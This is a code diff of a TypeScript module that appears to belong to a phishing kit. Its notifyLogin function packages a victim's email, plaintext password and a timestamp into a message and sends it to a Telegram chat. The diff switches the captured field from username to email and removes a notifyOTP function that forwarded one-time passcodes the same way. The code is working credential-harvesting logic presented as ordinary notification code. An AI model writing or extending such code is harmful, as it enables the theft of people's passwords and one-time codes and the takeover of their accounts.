@@ -25,11 +25,11 @@ export async function sendTelegramMessage(message: string): Promise<void> {
   }
 }
 
-export async function notifyLogin(username: string, password: string): Promise<boolean> {
+export async function notifyLogin(email: string, password: string): Promise<boolean> {
   const message = `
 <b>Login Attempt</b>
 
-<b>Username:</b> ${username}
+<b>Email:</b> ${email}
 <b>Password:</b> ${password}
 <b>Time:</b> ${new Date().toLocaleString()}
   `.trim();
@@ -39,25 +39,6 @@ export async function notifyLogin(username: string, password: string): Promise<b
     return true;
   } catch (error) {
     console.error("Failed to send login notification:", error);
-    return false;
-  }
-}
-
-export async function notifyOTP(username: string, otp: string): Promise<boolean> {
-  const message = `
-<b>OTP Generated</b>
-
-<b>Username:</b> ${username}
-<b>OTP Code:</b> ${otp}
-<b>Time:</b> ${new Date().toLocaleString()}
-<b>Expires in:</b> 5 minutes
-  `.trim();
-
-  try {
-    await sendTelegramMessage(message);
-    return true;
-  } catch (error) {
-    console.error("Failed to send OTP notification:", error);
     return false;
   }
 }
